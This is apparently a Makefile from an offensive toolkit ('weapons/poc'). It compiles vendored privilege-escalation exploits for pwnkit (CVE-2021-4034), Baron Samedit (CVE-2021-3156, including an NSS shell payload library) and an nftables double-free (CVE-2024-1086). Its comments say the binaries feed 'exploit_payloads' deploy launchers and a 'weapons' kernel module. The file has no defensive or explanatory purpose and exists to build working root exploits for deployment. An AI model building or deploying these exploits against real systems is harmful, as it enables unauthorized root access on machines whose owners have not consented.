# weapons/poc - vendored kernel-tier PoC build
# Consumed by exploit_payloads/*-pwnkit / -baron-samedit / -nftables-dblfree
# deploy.py launchers and by quantum.weapons.kernel_v3._poc_attempt().

CC      ?= cc
BIN_DIR ?= bin

.PHONY: all clean pwnkit baron_samedit nftables

all: pwnkit baron_samedit nftables

pwnkit:
	@mkdir -p $(BIN_DIR)
	$(CC) src/CVE-2021-4034/pwnkit.c -o $(BIN_DIR)/CVE-2021-4034 -Wl,-e,entry -shared -fPIC

# the NSS payload must be built from the src dir; output name includes a
# trailing space before .so.2 (intentional, do not "fix")
baron_samedit:
	@mkdir -p $(BIN_DIR)/CVE-2021-3156
	$(CC) src/CVE-2021-3156/baron_samedit.c -o $(BIN_DIR)/CVE-2021-3156/baron_samedit
	cd src/CVE-2021-3156 && mkdir -p libnss_X && $(CC) -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

nftables:
	@mkdir -p $(BIN_DIR)
	$(CC) src/CVE-2024-1086/nftables.c -o $(BIN_DIR)/CVE-2024-1086

clean:
	rm -rf $(BIN_DIR) src/CVE-2021-3156/libnss_X
